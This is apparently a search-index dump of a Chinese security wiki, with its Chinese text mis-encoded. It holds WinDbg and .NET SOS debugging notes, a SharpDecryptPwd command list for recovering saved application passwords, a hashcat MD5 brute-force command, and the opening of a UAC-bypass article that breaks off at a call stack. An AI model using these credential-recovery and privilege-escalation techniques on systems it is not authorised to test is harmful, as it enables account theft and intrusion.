7ffe57ca0000 aff3315b Jul 18 10:18:03 2063 C:\\Windows\\System32\\WS2_32.dll 7ffe4a200000 18d25282 Mar 14 04:54:26 1983 C:\\Windows\\SYSTEM32\\wbemcomn.dll 7ffe46290000 ee86f561 Oct 23 17:14:09 2096 C:\\Windows\\system32\\wbem\\wbemsvc.dll 7ffe46370000 9d244220 Jul 18 05:05:36 2053 C:\\Windows\\system32\\wbem\\fastprox.dll 7ffe45f80000 690ba034 Nov 06 03:06:28 2025 C:\\Windows\\SYSTEM32\\amsi.dll 7ffe55c80000 fa786637 Mar 01 20:14:47 2103 C:\\Windows\\SYSTEM32\\USERENV.dll 7ffe55cc0000 e5f6eb70 Apr 05 00:23:12 2092 C:\\Windows\\SYSTEM32\\profapi.dll 7ffe45f00000 abeb5625 May 26 17:55:49 2061 C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23080.2006-0\\MpOav.dll 7ffe56f20000 8c6c47c7 Aug 27 18:28:23 2044 C:\\Windows\\System32\\ole32.dll 7ffe4c2d0000 14531102 Oct 21 22:56:02 1980 C:\\Windows\\system32\\version.dll 7ffe4f9e0000 70a9de78 Nov 24 10:12:08 2029 c:\\windows\\system32\\WINHTTP.dll 7ffe55c40000 c6cd965c Sep 11 01:29:00 2075 C:\\Windows\\System32\\sspicli.dll 7ffe546a0000 c156fd2a Oct 15 04:46:34 2072 C:\\Windows\\SYSTEM32\\gpapi.dll 7ffe467c0000 c8c52eef Sep 27 01:10:07 2076 C:\\Windows\\System32\\SecurityCenterBrokerPS.dll SubSystemData: 0000000000000000 ProcessHeap: 00000264d3ca0000 ProcessParameters: 00000264d3e03300 CurrentDirectory: &#x27;C:\\Windows\\system32\\&#x27; WindowTitle: &#x27;C:\\Windows\\System32\\svchost.exe&#x27; ImageFile: &#x27;C:\\Windows\\System32\\svchost.exe&#x27; CommandLine: &#x27;C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p&#x27; DllPath: &#x27;&lt; Name not readable &gt;&#x27; Environment: 00000264d3e027f0 ALLUSERSPROFILE=C:\\ProgramData APPDATA=C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming CommonProgramFiles=C:\\Program Files\\Common Files CommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files CommonProgramW6432=C:\\Program Files\\Common Files COMPUTERNAME=DESKTOP-IMFKJGI ComSpec=C:\\Windows\\system32\\cmd.exe DriverData=C:\\Windows\\System32\\Drivers\\DriverData LOCALAPPDATA=C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local NUMBER_OF_PROCESSORS=2 OS=Windows_NT Path=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\WindowsApps PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC PROCESSOR_ARCHITECTURE=AMD64 PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 158 Stepping 9, GenuineIntel PROCESSOR_LEVEL=6 PROCESSOR_REVISION=9e09 ProgramData=C:\\ProgramData ProgramFiles=C:\\Program Files ProgramFiles(x86)=C:\\Program Files (x86) ProgramW6432=C:\\Program Files PSModulePath=%ProgramFiles%\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules PUBLIC=C:\\Users\\Public SystemDrive=C: SystemRoot=C:\\Windows TEMP=C:\\Windows\\SERVIC~1\\LOCALS~1\\AppData\\Local\\Temp TMP=C:\\Windows\\SERVIC~1\\LOCALS~1\\AppData\\Local\\Temp USERDOMAIN=NT AUTHORITY USERNAME=LOCAL SERVICE USERPROFILE=C:\\Windows\\ServiceProfiles\\LocalService windir=C:\\Windows æŸ¥çœ‹W32PROCESS 12345678910111213141516171819202122232425262728291: kd&gt; dt win32k!_W32PROCESS ffffb98ae4682300 +0x000 Process : 0x00000000`00000003 _EPROCESS +0x008 RefCount : 0xe4665b60 +0x00c W32PF_Flags : 0xffffb98a +0x010 InputIdleEvent : 0xffffb98a`e7946f40 _KEVENT +0x018 StartCursorHideTime : 0xe4682318 +0x020 NextStart : 0xffffb98a`e4682318 _W32PROCESS +0x028 pDCAttrList : 0x00000000`2ffdd002 Void +0x030 pBrushAttrList : 0xffffb98a`e45f5378 Void +0x038 W32Pid : 0xe4064378 +0x03c GDIHandleCount : 0n-18038 +0x040 GDIHandleCountPeak : 0 +0x044 UserHandleCount : 0n0 +0x048 UserHandleCountPeak : 0 +0x050 GDIPushLock : _EX_PUSH_LOCK +0x058 GDIEngUserMemAllocTable : _RTL_AVL_TABLE +0x0c0 GDIDcAttrFreeList : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x0d0 GDIBrushAttrFreeList : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x0e0 GDIW32PIDLockedBitmaps : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x0f0 hSecureGdiSharedHandleTable : (null) +0x0f8 DxProcess : (null) +0x100 DCompositionProcess : (null) +0x108 UMPDSandboxingEnabled : 0 +0x110 pWakeReference : (null) +0x118 defaultDpiContext : 0 +0x11c Dpi : 0 +0x120 bChangedGdiGammaRamp : 0y0 +0x120 bReadScreenBits : 0y0 +0x120 bWroteScreenBits : 0y0 å‚è€ƒæ–‡çŒ® ã€Šæ·±å…¥è§£æwindowsæ“ä½œç³»ç»Ÿ ç¬¬6ç‰ˆã€‹","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘.NET è°ƒè¯•","date":"2024-08-31T01:41:20.233Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘.NET è°ƒè¯•/","text":"æ¦‚è¿°ï¼šä½¿ç”¨ windbg è°ƒè¯• .NET æ–‡ä»¶ï¼Œè™½ç„¶ä½¿ç”¨windbgæ˜¯å¿…é¡»çš„æŠ€èƒ½ï¼Œä½†æ˜¯éå¿…è¦æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ dnSpyè°ƒè¯•ã€‚ [toc] ä»¥ C# å¦‚ä¸‹æ‰€ç¤ºçš„ä»£ç ä¸ºä¾‹ï¼š 123456789101112131415161718namespace DnrspEngine.Hooks.System&#123; class Win32Native &#123; [StructLayout(LayoutKind.Sequential)] internal class SECURITY_ATTRIBUTES &#123; &#125; internal static SafeFileHandle MySafeCreateFile(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, SECURITY_ATTRIBUTES securityAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile) &#123; &#125; internal static SafeFileHandle PxySafeCreateFile(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, SECURITY_ATTRIBUTES securityAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile) &#123; &#125; &#125;&#125; å‘½åç©ºé—´ DnrspEngine.Hooks.System æœ‰ä¸€ä¸ªç±» Win32Nativeã€‚ è°ƒè¯• .Net ç¨‹åºå‰ï¼Œéœ€è¦åŠ è½½ SOS æ‰©å±•ï¼ŒSOS (Son of Strike) æ˜¯ .NET è°ƒè¯•çš„æ‰©å±•ï¼Œå®ƒæä¾›äº†å¾ˆå¤šç”¨äºè°ƒè¯• .NET åº”ç”¨ç¨‹åºçš„å‘½ä»¤ã€‚é¦–å…ˆï¼Œä½ éœ€è¦åŠ è½½ SOS æ‰©å±•ï¼š 1.loadby sos clr 0x01 æŸ¥çœ‹å‡½æ•°åœ°å€ !name2ee æŸ¥çœ‹ç±»ä¿¡æ¯ï¼Œå¦‚æœä¸çŸ¥é“æœ‰å“ªäº›ç±»ï¼Œå¯ä»¥ä½¿ç”¨ !DumpHeap å‘½ä»¤ï¼Œå¦‚æœè¦æŸ¥çœ‹å…·ä½“çš„å¯¹è±¡å…·æœ‰çš„æ–¹æ³•ä½†æ˜¯åˆæ²¡æœ‰æºä»£ç æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ dnSpy è¿™ç±»çš„åç¼–è¯‘å·¥å…·ã€‚ 1234567891011# æŸ¥çœ‹ç±»çš„å±æ€§!name2ee mscorelib.dll!Microsoft.Win32.Win32Native# è¾“å‡ºå¦‚ä¸‹æ‰€ç¤º0:026&gt; !name2ee mscorlib.dll!Microsoft.Win32.Win32NativeModule: 70931000Assembly: mscorlib.dllToken: 0200000eMethodTable: 709acdccEEClass: 70a67be8Name: Microsoft.Win32.Win32Native 1234567891011# æŸ¥çœ‹å…·ä½“çš„å‡½æ•°!name2ee mscorlib.dll Win32Native.SafeCreateFile // éœ€è¦çŸ¥é“å‡½æ•°å# è¾“å‡ºå¦‚ä¸‹æ‰€ç¤º0:026&gt; !name2ee mscorlib.dll Win32Native.SafeCreateFileModule: 70931000Assembly: mscorlib.dllToken: 06000042MethodDesc: 70b9db00Name: Microsoft.Win32.Win32Native.SafeCreateFile(System.String, Int32, System.IO.FileShare, SECURITY_ATTRIBUTES, System.IO.FileMode, Int32, IntPtr)JITTED Code Address: 70d044a0 è¾“å‡ºåˆ†æï¼Œä»¥æˆ‘å½“å‰è¦ä½¿ç”¨çš„å­—æ®µä¸ºä¸»ï¼š Module: æ¨¡å—å¥æŸ„ MethodTableï¼šæ–¹æ³•è¡¨ã€‚ç»™å‡ºäº†æˆ‘ä»¬å¯¹åº”çš„ç±»çš„æ–¹æ³•è¡¨çš„åœ°å€ !DumpHeap !DumpHeap å‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰è°ƒè¯•çš„è¿›ç¨‹çš„å †ä¸Šçš„å¯¹è±¡ï¼Œç•¥å¾®å±€é™ -statï¼šåªè¾“å‡ºå †ä¸Šæ‰€æœ‰ç±»å‹å¯¹è±¡çš„ç»Ÿè®¡æ‘˜è¦ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„è®¡æ•°ã€å¤§å°å’Œç±»å‹åç§°ã€‚è¿™ä¸ªé€‰é¡¹éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥å¿«é€Ÿäº†è§£å †ä¸Šå¯¹è±¡çš„åˆ†å¸ƒæƒ…å†µã€‚ -nostringsï¼šæ’é™¤å­—ç¬¦ä¸²çš„è¾“å‡ºã€‚å½“ä¸ -stat ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥ä½¿å¾—è¾“å‡ºæ›´åŠ ç®€æ´ï¼Œä¸“æ³¨äºéå­—ç¬¦ä¸²ç±»å‹çš„å¯¹è±¡ã€‚ -gen Xï¼šä»…è¾“å‡ºå±äºæŒ‡å®šä»£çš„å¯¹è±¡ã€‚åœ¨ .NET ä¸­ï¼Œå¯¹è±¡æ ¹æ®å®ƒä»¬çš„ç”Ÿå‘½å‘¨æœŸè¢«åˆ†é…åˆ°ä¸åŒçš„ä»£ï¼ˆGenerationï¼‰ï¼Œè¿™ä¸ªé€‰é¡¹å…è®¸ä½ æŸ¥çœ‹ç‰¹å®šä»£çš„å¯¹è±¡ã€‚ -min X å’Œ -max Xï¼šå¿½ç•¥å°äºæˆ–å¤§äºæŒ‡å®šå­—èŠ‚å¤§å°çš„å¯¹è±¡ã€‚è¿™ä¸¤ä¸ªé€‰é¡¹å¯ä»¥å¸®åŠ©ä½ è¿‡æ»¤æ‰ä¸æ„Ÿå…´è¶£çš„å°å¯¹è±¡æˆ–å¤§å¯¹è±¡ã€‚ -mt MethodTableï¼šä»…åˆ—å‡ºå…·æœ‰æŒ‡å®š MethodTable çš„å¯¹è±¡ã€‚MethodTable æ˜¯ .NET ä¸­ç”¨äºæè¿°ç±»å‹çš„å†…éƒ¨ç»“æ„ã€‚ -type typeï¼šä»…åˆ—å‡ºç±»å‹åä¸ºæŒ‡å®šå­å­—ç¬¦ä¸²çš„å¯¹è±¡ã€‚è¿™ä¸ªé€‰é¡¹å…è®¸ä½ æŒ‰ç±»å‹åç§°è¿‡æ»¤è¾“å‡ºã€‚ -liveï¼šä»…è¾“å‡ºä»ç„¶å­˜æ´»çš„å¯¹è±¡ï¼Œå³é‚£äº›è¿˜æ²¡æœ‰è¢«åƒåœ¾å›æ”¶å™¨æ ‡è®°ä¸ºå¯å›æ”¶çš„å¯¹è±¡ã€‚ -deadï¼šä»…è¾“å‡ºå·²æ­»äº¡çš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡å°†åœ¨ä¸‹ä¸€æ¬¡å®Œå…¨åƒåœ¾å›æ”¶ï¼ˆFull GCï¼‰ä¸­è¢«å›æ”¶ã€‚ -cacheï¼šå°†å¯¹è±¡ä¿å­˜åœ¨å†…éƒ¨ç¼“å­˜ä¸­ä»¥ä¾›ä»¥åä½¿ç”¨ï¼Œè¿™æœ‰åŠ©äºåŠ å¿«åç»­æ‰«æå †çš„é€Ÿåº¦ã€‚ -lxï¼šåªæ‰“å°æ¯ä¸ªå †ä¸­çš„æŒ‡å®šæ•°é‡çš„é¡¹ï¼Œè€Œä¸æ˜¯æ‰€æœ‰å¯¹è±¡ã€‚è¿™å¯ä»¥å¸®åŠ©ä½ é™åˆ¶è¾“å‡ºçš„æ•°é‡ã€‚ -shortï¼šä»…æ‰“å°å‡ºå¯¹è±¡çš„åœ°å€ã€‚è¿™ä¸ªé€‰é¡¹é€šå¸¸ä¸å…¶ä»–å‘½ä»¤ï¼ˆå¦‚ .foreachï¼‰ç»„åˆä½¿ç”¨ï¼Œç”¨äºè‡ªåŠ¨åŒ–å¤„ç†æˆ–è¿›ä¸€æ­¥åˆ†æã€‚ 0x02 æŸ¥çœ‹æ–¹æ³•æœ‰å“ªäº› !dumpmt æŸ¥çœ‹æ–¹æ³•æœ‰å“ªäº› 12345678910111213141516171819202122232425!dumpmt -md %MethodTable% # æŸ¥çœ‹æ–¹æ³•æœ‰å“ªäº›---------------------------------------!dumpmt -md 00007ffd79054540# è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š0:024&gt; !dumpmt -md 00007ffd79054540EEClass: 00007ffd792da338Module: 00007ffd79051810Name: DnrspEngine.Hooks.System.Win32NativemdToken: 000000000200000bFile: DnrspEngine, Version=1.0.0.1031, Culture=neutral, PublicKeyToken=nullBaseSize: 0x18ComponentSize: 0x0Slots in VTable: 7Number of IFaces in IFaceMap: 0--------------------------------------MethodDesc Table Entry MethodDesc JIT Name00007ffdd5c957a0 00007ffdd579c7a0 PreJIT System.Object.ToString()00007ffdd5d0d2b0 00007ffdd5935560 PreJIT System.Object.Equals(System.Object)00007ffdd5cfaba0 00007ffdd5935588 PreJIT System.Object.GetHashCode()00007ffdd5d0aac0 00007ffdd5935590 PreJIT System.Object.Finalize()00007ffd79159448 00007ffd79054538 NONE DnrspEngine.Hooks.System.Win32Native..ctor()00007ffd792e1440 00007ffd79054518 JIT DnrspEngine.Hooks.System.Win32Native.MySafeCreateFile(System.String, Int32, System.IO.FileShare, SECURITY_ATTRIBUTES, System.IO.FileMode, Int32, IntPtr)00007ffd792e1810 00007ffd79054528 JIT DnrspEngine.Hooks.System.Win32Native.PxySafeCreateFile(System.String, Int32, System.IO.FileShare, SECURITY_ATTRIBUTES, System.IO.FileMode, Int32, IntPtr) è¾“å‡ºåˆ†æï¼š å¯ä»¥çœ‹åˆ°è¾“å‡ºå†…å®¹æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œå¹¶ä¸”è¾“å‡ºäº†æ–¹æ³•è¡¨ç¤ºä»¥åŠå„ä¸ªæ–¹æ³•å¯¹åº”çš„åœ°å€ã€‚è¿™é‡Œå°±å¯ä»¥å¯¹å‡½æ•°ä¸‹æ–­ç‚¹äº†ï¼Œä»¥ DnrspEngine.Hooks.System.Win32Native.MySafeCreateFile ä¸ºä¾‹ ï¼ˆæ³¨æ„åªæœ‰ JIT çš„å‡½æ•°æ‰å¯ä»¥ä¸‹æ–­ç‚¹ï¼‰ 0x03 æ·»åŠ æ–­ç‚¹ 123456!bpmd -md 00007ffd79054518# è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š0:024&gt; !bpmd -md 00007ffd79054518MethodDesc = 00007ffd79054518Setting breakpoint: bp 00007FFD792E1440 [DnrspEngine.Hooks.System.Win32Native.MySafeCreateFile(System.String, Int32, System.IO.FileShare, SECURITY_ATTRIBUTES, System.IO.FileMode, Int32, IntPtr)] åˆ†æï¼š å¯ä»¥çœ‹åˆ°æ–­ç‚¹è®¾ç½®ä¿¡æ¯ï¼Œå·²ç»å‡½æ•°å‚æ•°ç­‰ã€‚ç­‰å¾…å‡½æ•°æ‰§è¡Œå°±å¯ä»¥è§¦å‘æ–­ç‚¹ã€‚ 0x04 æŸ¥çœ‹å †æ ˆ 1234567!clrstack # æŸ¥çœ‹æ‰€æœ‰çº¿ç¨‹çš„å †æ ˆ!dumpstack#æˆ–è€…~*e!dumpstack æ·»åŠ åˆå§‹æ–­ç‚¹ 123450:000&gt; sxe ld:clrjit0:000&gt; .load C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\sos.dll0:000&gt; .load C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\clr.dll0:000&gt; .loadby sos clr ï¼ˆç­‰åŒäºä¸Šé¢ä¸¤æ¡å‘½ä»¤ï¼‰ 0x06 å…¶ä»–å‘½ä»¤è¡¥å…… å¸®åŠ©å‘½ä»¤ 1!help æ¸…å± 1!cls æŸ¥çœ‹å½“å‰æ‰˜ç®¡çº¿ç¨‹å·²æ‰§è¡Œæ—¶é—´ 1!runaway æŸ¥çœ‹å½“å‰çº¿ç¨‹æ± æƒ…å†µ 1!threadpool","tags":[{"name":"windows/windbg","slug":"windows-windbg","permalink":"https://hodlyounger.github.io/tags/windows-windbg/"},{"name":"dump","slug":"dump","permalink":"https://hodlyounger.github.io/tags/dump/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€å¼±å¯†ç ã€‘SharpDecrptyçš„ä½¿ç”¨","date":"2024-08-31T01:41:20.227Z","path":"wiki/å¼±å¯†ç /ã€å¼±å¯†ç ã€‘SharpDecrptyPwdä½¿ç”¨/","text":"[toc] ç®€ä»‹ uknowsec/SharpDecryptPwd: å¯¹å¯†ç å·²ä¿å­˜åœ¨ Windwos ç³»ç»Ÿä¸Šçš„éƒ¨åˆ†ç¨‹åºè¿›è¡Œè§£æ,åŒ…æ‹¬ï¼šNavicat,TeamViewer,FileZilla,WinSCP,Xmangagerç³»åˆ—äº§å“ï¼ˆXshell,Xftp)ã€‚æºç ï¼šhttps://github.com/RowTeam/SharpDecryptPwd","tags":[{"name":"Tools","slug":"Tools","permalink":"https://hodlyounger.github.io/tags/Tools/"},{"name":"weakpwd","slug":"weakpwd","permalink":"https://hodlyounger.github.io/tags/weakpwd/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å¼±å¯†ç ","slug":"wiki/å¼±å¯†ç ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%BC%B1%E5%AF%86%E7%A0%81/"}]},{"title":"å¼±å£ä»¤æ£€æµ‹","date":"2024-08-31T01:41:20.208Z","path":"wiki/å¼±å¯†ç /ã€å¼±å£ä»¤ã€‘index/","text":"æ¦‚è¿°ï¼šå¼±å£ä»¤ï¼ˆå¼±å¯†ç ã€weakpwd) é¡¹ç›®ä»‹ç» ä¸»è¦è®°å½•å¼±å¯†ç æ£€æµ‹çš„ä¸€äº›å·¥ä½œï¼Œç›®å‰æ¶‰åŠçš„å¼±å¯†ç æ£€æµ‹è½¯ä»¶æœ‰ ElasticSearchã€JBossã€OpenVPN ä¸‰ä¸ªè½¯ä»¶ï¼Œå¦‚ mysqlã€RDPã€SSHç­‰çŸ¥åæœåŠ¡çš„å¼±å¯†ç æ£€æµ‹å·²æœ‰ä¼—å¤šå¼€æºå·¥å…·å¯ä¾›ä½¿ç”¨ã€‚ å¼±å¯†ç ç›¸å…³èµ„æ–™ æ¦‚è¿°ï¼š å¼±å¯†ç æ£€æµ‹æ˜¯ï¼Ÿ å¼€æºæ•´ç† å¼€æºå·¥å…· hashcat [hashcat wiki] ä¸€æ¬¾å¼€æºç ´è§£å¯†ç çš„å·¥å…· shack2/SNETCracker è¶…çº§å¼±å£ä»¤æ£€æŸ¥å·¥å…·æ˜¯ä¸€æ¬¾Windowså¹³å°çš„å¼±å£ä»¤å®¡è®¡å·¥å…·ï¼Œæ”¯æŒæ‰¹é‡å¤šçº¿ç¨‹æ£€æŸ¥ï¼Œå¯å¿«é€Ÿå‘ç°å¼±å¯†ç ã€å¼±å£ä»¤è´¦å·ï¼Œå¯†ç æ”¯æŒå’Œç”¨æˆ·åç»“åˆè¿›è¡Œæ£€æŸ¥ï¼Œå¤§å¤§æé«˜æˆåŠŸç‡ï¼Œæ”¯æŒè‡ªå®šä¹‰æœåŠ¡ç«¯å£å’Œå­—å…¸ã€‚ RowTeam/SharpDecryptPwd: SharpDecryptPwd source, To Decrypt Navicat,Xmanager,Filezilla,Foxmail,WinSCP,etc ç ´è§£äº†ä»¥ä¸‹è½¯ä»¶ï¼š 12345678910SharpDecryptPwd NavicatSharpDecryptPwd XmanagerSharpDecryptPwd TeamViewerSharpDecryptPwd FileZillaSharpDecryptPwd FoxmailSharpDecryptPwd TortoiseSVNSharpDecryptPwd WinSCPSharpDecryptPwd ChromeSharpDecryptPwd RDCManSharpDecryptPwd SunLogin å¼€æºå¯†ç è§£å¯†åº“ï¼š bcrypt password hashing (â€œpassword encryptionâ€) for your software and your servers bCrypt å¼€æºå¯†ç è§£å¯†åº“ æ¨èé˜…è¯» å¸¸ç”¨å¼€æºçš„å¼±å£ä»¤æ£€æŸ¥å®¡è®¡å·¥å…·_å¼±å£ä»¤æ£€æµ‹å·¥å…·_Marsalçš„åšå®¢-CSDNåšå®¢ åˆ—è¡¨æ–‡ç«  ã€å¼±å¯†ç ã€‘Windows å¼±å¯†ç  ã€å¼±å¯†ç ã€‘WebLogic ã€å¼±å¯†ç ã€‘PostgreSQL ã€å¼±å¯†ç ã€‘OpenVPN ã€å¼±å¯†ç ã€‘MonogoDB ã€å¼±å¯†ç ã€‘Jboss ã€å¼±å¯†ç ã€‘ElasticSearchå¼±å¯†ç  ã€å¼±å¯†ç ã€‘ActiveMQ","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å¼±å¯†ç ","slug":"wiki/å¼±å¯†ç ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%BC%B1%E5%AF%86%E7%A0%81/"}]},{"title":"hashcatä½¿ç”¨","date":"2024-08-31T01:41:20.207Z","path":"wiki/å¼±å¯†ç /hashcatä½¿ç”¨/","text":"è§£å¯† md5 ç›®å‰åªè§£å¯†å®˜æ–¹çš„å¥½ä½¿ï¼Œä½¿ç”¨æœ¬åœ°çš„md5æ–‡æœ¬è§£å¯†å¤±è´¥ 1hashcat -m 0 -w 4 -a 3 8743b52063cd84097a65d1633f5c74f5","tags":[{"name":"weakpwd","slug":"weakpwd","permalink":"https://hodlyounger.github.io/tags/weakpwd/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å¼±å¯†ç ","slug":"wiki/å¼±å¯†ç ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%BC%B1%E5%AF%86%E7%A0%81/"}]},{"title":"ã€ææƒã€‘åˆ©ç”¨AppInfo RPCæœåŠ¡çš„UAC BypassæŠ€æœ¯è¯¦è§£","date":"2024-08-31T01:41:20.203Z","path":"wiki/å®‰å…¨/ææƒ/ã€ææƒã€‘åˆ©ç”¨AppInfo RPCæœåŠ¡çš„UAC BypassæŠ€æœ¯è¯¦è§£/","text":"æ¦‚è¿°ï¼š åˆ©ç”¨ AppInfo RPC æœåŠ¡çš„ UAC ByPass ææƒæµç¨‹ 0x01 å‰è¨€ åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰ç¡®ä¿å¤§å®¶å·²ç»åŸºæœ¬äº† UAC çš„å¤§è‡´æµç¨‹ã€‚ UAC çš„è¯·æ±‚éƒ½æ˜¯äº¤ç”± AppInfo è¿™ä¸ªç³»ç»ŸæœåŠ¡æ¥å¤„ç†çš„ï¼ŒAppInfo çš„è¿›ç¨‹ä¸º svchostã€‚ åœ¨ææƒæµç¨‹ä¸­ï¼ŒAppinfo ä¹Ÿä»…ä»…æ˜¯ä½œä¸ºä¸­é—´è¿æ¥çš„ä¸€ç¯ï¼Œä¸€æ–¹é¢å¤„ç†åº”ç”¨ç¨‹åºè¯·æ±‚æ¥çš„UACè¯·æ±‚ï¼Œå¦ä¸€æ–¹é¢æ‹‰èµ·consent.exe æ¥å¤„ç†ç”¨æˆ·æ“ä½œï¼Œæœ€åå°†ç”¨æˆ·æ“åé¦ˆç»™åº”ç”¨ç¨‹åºã€‚è¿™å°±æ˜¯ UAC çš„å¤§è‡´æµç¨‹ã€‚æœ¬æ–‡ç€é‡Appinfo çš„ç›¸å…³æµç¨‹æ¥è¯´æ˜ä¸€ä¸‹å¦‚ä½•åˆ©ç”¨ Appinfo è¿›ç¨‹ UAC Bypassã€‚ 0x02 AppInfo è°ƒç”¨è¯´æ˜ æ“ä½œï¼šå¯ä»¥è°ƒè¯• Appinfo çš„è¿›ç¨‹ï¼Œç„¶åé€šè¿‡å¯åŠ¨ UAC è¿›ç¨‹è§‚å¯Ÿä¸€ä¸ªç¨‹åºçš„uacè¯·æ±‚åˆ°äº† AppInfo ä¹‹åçš„æµç¨‹ã€‚ç»“åˆIDAçš„ exports å¯ä»¥åœ¨ä¸€äº›å…³é”®å‡½æ•°æ‰“ä¸Šæ–­ç‚¹ç„¶åè¿›è¡Œè°ƒè¯•ã€‚å½“ç„¶å› ä¸ºç½‘ä¸Šå·²ç»æœ‰å¤§é‡çš„åˆ†æå’Œè°ƒç”¨æµç¨‹è¯´æ˜äº†ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥éª¤å¯ä»¥çœç•¥ç›´æ¥åœ¨ä¸€äº›å…³é”®çš„å‡½æ•°ä¸Šæ‰“æ–­ç‚¹è°ƒè¯•æŸ¥çœ‹å †æ ˆå’Œå‚æ•°ã€‚ å› ä¸ºUACçš„ææƒéƒ½éœ€è¦åˆ›å»ºUIè¿›ç¨‹æ¥è®©ç”¨æˆ·è¿›è¡Œæ“ä½œï¼Œè¿™ä¸ªUIè¿›è¡Œå°±æ˜¯ consent.exeï¼Œæ‰€ä»¥ç›´æ¥è§‚å¯Ÿ consent.exe çš„åˆ›å»ºå’Œè°ƒç”¨å³å¯ã€‚ è¿™é‡Œç›´æ¥å¯¹ AiLaunchConsentUI æ‰“æ–­ç‚¹ç„¶åæŸ¥çœ‹å †æ ˆã€‚ consent.exeçš„åˆ›å»º AppInfo æœåŠ¡æ”¶åˆ°rpcæ¶ˆæ¯åï¼Œæœ€ç»ˆé€šè¿‡ CreateProcessAsUser åˆ›å»ºã€‚ è¿™ç¯‡æ–‡ç« è®²çš„æ¯”è¾ƒç»†è‡´ï¼šUACé€†å‘ è°ƒç”¨å †æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223[0x0] ntdll!NtCreateUserProcess 0xdf231fc698 0x7ff9da72b473 [0x1] KERNELBASE!CreateProcessInternalW+0xfe3 0xdf231fc6a0 0x7ff9da728a03 [0x2] KERNELBASE!CreateProcessAsUserW+0x63 0xdf231fdc70 0x7ff9daa4de30 [0x3] KERNEL32!CreateProcessAsUserWStub+0x60 0xdf231fdce0 0x7ff9d4a4526b [0x4] appinfo!AiLaunchProcess+0x8eb 0xdf231fdd50 0x7ff9d4a4789d [0x5] appinfo!AiLaunchConsentUI+0x51d 0xdf231fec40 0x7ff9d4a471e3 [0x6] appinfo!AiCheckLUA+0x343 0xdf231fee60 0x7ff9d4a62ff1 [0x7] appinfo!AipGetTokenForService+0x245 0xdf231ff040 0x7ff9d4a639b6 [0x8] appinfo!RAiGetTokenForCOM+0x206 0xdf231ff160 0x7ff9db4ab4b3 [0x9] RPCRT4!Invoke+0x73 0xdf231ff220 0x7ff9db50c5ea [0xa] RPCRT4!Ndr64AsyncServerWorker+0x39a 0xdf231ff2d0 0x7ff9db489188 [0xb] RPCRT4!DispatchToStubInCNoAvrf+0x18 0xdf231ff3e0 0x7ff9db46a3a6 [0xc] RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1a6 0xdf231ff430 0x7ff9db469fd6 [0xd] RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x186 0xdf231ff510 0x7ff9db47730f [0xe] RPCRT4!LRPC_SCALL::DispatchRequest+0x16f 0xdf231ff5b0 0x7ff9db4768c8 [0xf] RPCRT4!LRPC_SCALL::HandleRequest+0x7f8 0xdf231ff680 0x7ff9db475eb1 [0x10] RPCRT4!LRPC_ADDRESS::HandleRequest+0x341 0xdf231ff790 0x7ff9db47591e [0x11] RPCRT4!LRPC_ADDRESS::ProcessIO+0x89e 